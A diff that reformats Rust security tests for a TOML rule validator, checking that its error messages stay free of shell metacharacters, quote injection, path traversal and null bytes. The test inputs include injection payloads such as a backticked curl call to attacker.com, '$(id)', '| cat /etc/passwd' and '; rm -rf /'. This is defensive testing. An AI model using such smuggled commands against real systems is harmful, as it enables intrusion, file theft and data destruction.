@@ -22,8 +22,11 @@ fn test_malicious_file_path_in_errors() {
         if let Err(errors) = result {
             for error in errors {
                 // Check that error messages don't have active shell metacharacters
-                assert!(!contains_active_shell_metachar(&error),
-                        "Error message contains dangerous characters: {}", error);
+                assert!(
+                    !contains_active_shell_metachar(&error),
+                    "Error message contains dangerous characters: {}",
+                    error
+                );
 
                 // Verify path is quoted or escaped in error message
                 if error.contains(path) {
@@ -48,12 +51,15 @@ fn test_malicious_rule_names() {
     ];
 
     for name in malicious_names {
-        let toml = format!(r#"
+        let toml = format!(
+            r#"
 [[rules]]
 name = "{}"
 type = "keyword"
 # Missing required fields to trigger validation errors
-        "#, name.replace('"', r#"\""#));
+        "#,
+            name.replace('"', r#"\""#)
+        );
 
         let test_file = format!("test_injection_{}.toml", rand_string());
         fs::write(&test_file, toml).unwrap();
@@ -66,12 +72,18 @@ type = "keyword"
         if let Err(errors) = result {
             for error in &errors {
                 // Error should mention the rule but not execute anything
-                assert!(!contains_active_shell_metachar(error),
-                        "Error contains active shell metachar: {}", error);
+                assert!(
+                    !contains_active_shell_metachar(error),
+                    "Error contains active shell metachar: {}",
+                    error
+                );
 
                 // Error should not have unescaped quotes that could break quoting
-                assert!(!has_quote_injection(error),
-                        "Error has quote injection vulnerability: {}", error);
+                assert!(
+                    !has_quote_injection(error),
+                    "Error has quote injection vulnerability: {}",
+                    error
+                );
             }
             println!("✓ Safely handled malicious rule name: {:?}", name);
         }
@@ -89,7 +101,8 @@ fn test_malicious_regex_patterns() {
     ];
 
     for pattern in malicious_patterns {
-        let toml = format!(r#"
+        let toml = format!(
+            r#"
 [[rules]]
 name = "injection_test"
 type = "regex"
@@ -97,7 +110,9 @@ field = "description"
 pattern = "{}"
 risk_score = 50
 description = "Test"
-        "#, pattern.replace('"', r#"\""#).replace('\\', r#"\\"#));
+        "#,
+            pattern.replace('"', r#"\""#).replace('\\', r#"\\"#)
+        );
 
         let test_file = format!("test_pattern_{}.toml", rand_string());
         fs::write(&test_file, &toml).unwrap();
@@ -110,8 +125,11 @@ description = "Test"
         if let Err(errors) = result {
             for error in &errors {
                 // Verify pattern in error message is safe
-                assert!(!contains_active_shell_metachar(error),
-                        "Pattern error contains shell metachar: {}", error);
+                assert!(
+                    !contains_active_shell_metachar(error),
+                    "Pattern error contains shell metachar: {}",
+                    error
+                );
             }
         }
     }
@@ -139,8 +157,11 @@ evil = `curl http://attacker.com`
     match result {
         Err(errors) => {
             for error in &errors {
-                assert!(!contains_active_shell_metachar(error),
-                        "TOML error contains dangerous chars: {}", error);
+                assert!(
+                    !contains_active_shell_metachar(error),
+                    "TOML error contains dangerous chars: {}",
+                    error
+                );
             }
         }
         Ok(_) => {
@@ -153,7 +174,10 @@ evil = `curl http://attacker.com`
 fn test_error_message_format_safety() {
     // Verify that validation errors are formatted safely
     let test_cases = vec![
-        ("Missing field with ; injection", "field\"; touch /tmp/pwned; echo \""),
+        (
+            "Missing field with ; injection",
+            "field\"; touch /tmp/pwned; echo \"",
+        ),
         ("Backtick injection", "`whoami`"),
         ("Command substitution", "$(id)"),
         ("Pipe injection", "| cat /etc/passwd"),
@@ -161,7 +185,8 @@ fn test_error_message_format_safety() {
     ];
 
     for (test_name, dangerous_value) in test_cases {
-        let toml = format!(r#"
+        let toml = format!(
+            r#"
 [[rules]]
 name = "test"
 type = "metadata"
@@ -169,7 +194,9 @@ field = "{}"
 check = "is_none"
 risk_score = 50
 description = "Test"
-        "#, dangerous_value.replace('"', r#"\""#));
+        "#,
+            dangerous_value.replace('"', r#"\""#)
+        );
 
         let test_file = format!("test_format_{}.toml", rand_string());
         fs::write(&test_file, toml).unwrap();
@@ -181,12 +208,24 @@ description = "Test"
         if let Err(errors) = result {
             for error in &errors {
                 // Check error message structure is safe
-                assert!(!error.contains("`;"),
-                        "{}: Error has backtick-semicolon sequence: {}", test_name, error);
-                assert!(!error.contains("&&"),
-                        "{}: Error has && sequence: {}", test_name, error);
-                assert!(!error.contains("||"),
-                        "{}: Error has || sequence: {}", test_name, error);
+                assert!(
+                    !error.contains("`;"),
+                    "{}: Error has backtick-semicolon sequence: {}",
+                    test_name,
+                    error
+                );
+                assert!(
+                    !error.contains("&&"),
+                    "{}: Error has && sequence: {}",
+                    test_name,
+                    error
+                );
+                assert!(
+                    !error.contains("||"),
+                    "{}: Error has || sequence: {}",
+                    test_name,
+                    error
+                );
             }
         }
     }
@@ -215,12 +254,19 @@ fn test_path_traversal_in_file_path() {
 
                 // Error should mention failure (either file read or TOML parsing)
                 // Some paths might exist (like /etc/passwd) and fail TOML parsing instead
-                assert!(error.contains("Failed to read") || error.contains("Invalid TOML"),
-                        "Expected failure error for: {}. Got: {}", path, error);
+                assert!(
+                    error.contains("Failed to read") || error.contains("Invalid TOML"),
+                    "Expected failure error for: {}. Got: {}",
+                    path,
+                    error
+                );
 
                 // Path in error should not break out of quotes
-                assert!(!has_path_traversal_risk(error),
-                        "Error has path traversal risk: {}", error);
+                assert!(
+                    !has_path_traversal_risk(error),
+                    "Error has path traversal risk: {}",
+                    error
+                );
             }
         }
     }
@@ -229,11 +275,7 @@ fn test_path_traversal_in_file_path() {
 #[test]
 fn test_null_byte_injection() {
     // Test null byte injection attempts
-    let null_byte_cases = vec![
-        "test\0.toml",
-        "rules\x00.toml",
-        "injection\0; rm -rf /",
-    ];
+    let null_byte_cases = vec!["test\0.toml", "rules\x00.toml", "injection\0; rm -rf /"];
 
     for path in null_byte_cases {
         let result = validate_file_safely(path);
@@ -241,10 +283,8 @@ fn test_null_byte_injection() {
         if let Err(errors) = result {
             for error in &errors {
                 // Null bytes should not appear in error messages
-                assert!(!error.contains('\0'),
-                        "Error contains null byte");
-                assert!(!error.contains("\\x00"),
-                        "Error contains null byte escape");
+                assert!(!error.contains('\0'), "Error contains null byte");
+                assert!(!error.contains("\\x00"), "Error contains null byte escape");
             }
         }
     }
